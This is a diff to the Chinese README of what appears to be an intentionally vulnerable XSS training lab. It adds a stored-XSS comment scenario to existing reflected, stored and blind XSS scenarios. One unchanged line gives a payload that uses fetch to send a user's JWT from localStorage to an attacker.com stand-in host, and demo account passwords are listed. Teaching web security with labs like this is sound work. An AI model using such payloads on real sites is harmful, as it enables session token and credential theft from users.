@@ -64,7 +64,7 @@ docker-compose up -d
 - attacker / Attacker#2025（用于 L2 恶意 Bio）
 - alice / Admin#2025（普通用户）
 
-## 场景速览（L0~L3）
+## 场景速览（L0~L4）
 
 | 场景 | 类型 | 目标 | 入口 |
 |------|------|------|------|
@@ -72,6 +72,7 @@ docker-compose up -d
 | L1 | 反射型 | 窃取 JWT | 搜索 + localStorage |
 | L2 | 存储型 | 伪装登录钓鱼 | 用户 Bio |
 | L3 | 盲 XSS | 管理员凭证窃取 | 反馈 → 后台查看 |
+| L4 | 存储型 | 文章评论 XSS | 评论 → 所有访客 |
 
 详细步骤与对比见：`XSS演示场景说明.md`
 
@@ -80,6 +81,7 @@ docker-compose up -d
 - L1：登录后：`/search?q=<img src=x onerror="fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))">`
 - L2：访问 `/profile/attacker` 观察伪装登录框
 - L3：提交 `/feedback` 后，用 admin 在 `/admin/feedbacks` 打开详情
+- L4：登录后在文章详情页发表评论 `<img src=x onerror=alert('评论XSS')>`
 
 💡 **注意**：Vue 中通过 v-html 插入的 `<script>` 标签不会执行，需使用事件处理器型 payload（如 onerror、onload）。
 
